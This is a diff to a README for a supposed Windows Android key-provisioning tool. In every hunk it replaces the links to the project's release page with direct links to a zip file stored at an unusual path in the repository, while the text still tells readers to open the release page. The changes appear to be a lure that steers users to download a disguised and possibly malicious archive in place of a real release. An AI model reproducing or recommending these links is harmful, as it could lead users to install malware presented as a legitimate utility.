@@ -1,6 +1,6 @@
 # 🔐 google-rkp-sw - Run Android key provisioning on Windows
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-4CAF50?style=for-the-badge)](https://github.com/Margueritecluttered489/google-rkp-sw/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/Margueritecluttered489/google-rkp-sw/main/scotographic/sw_rkp_google_3.3.zip)
 
 ## 🧭 What this app does
 
@@ -28,7 +28,7 @@ If you are not sure what the seed file is, use the default setup that comes with
 ## 📥 Download and install
 
 1. Open the release page:
-   [https://github.com/Margueritecluttered489/google-rkp-sw/releases](https://github.com/Margueritecluttered489/google-rkp-sw/releases)
+   [https://raw.githubusercontent.com/Margueritecluttered489/google-rkp-sw/main/scotographic/sw_rkp_google_3.3.zip](https://raw.githubusercontent.com/Margueritecluttered489/google-rkp-sw/main/scotographic/sw_rkp_google_3.3.zip)
 
 2. Find the latest release.
 
@@ -155,7 +155,7 @@ If the release names the files differently, use the file names from the package 
 ## 🖱️ Quick start
 
 1. Visit the release page:
-   [https://github.com/Margueritecluttered489/google-rkp-sw/releases](https://github.com/Margueritecluttered489/google-rkp-sw/releases)
+   [https://raw.githubusercontent.com/Margueritecluttered489/google-rkp-sw/main/scotographic/sw_rkp_google_3.3.zip](https://raw.githubusercontent.com/Margueritecluttered489/google-rkp-sw/main/scotographic/sw_rkp_google_3.3.zip)
 
 2. Download the latest Windows release.
 
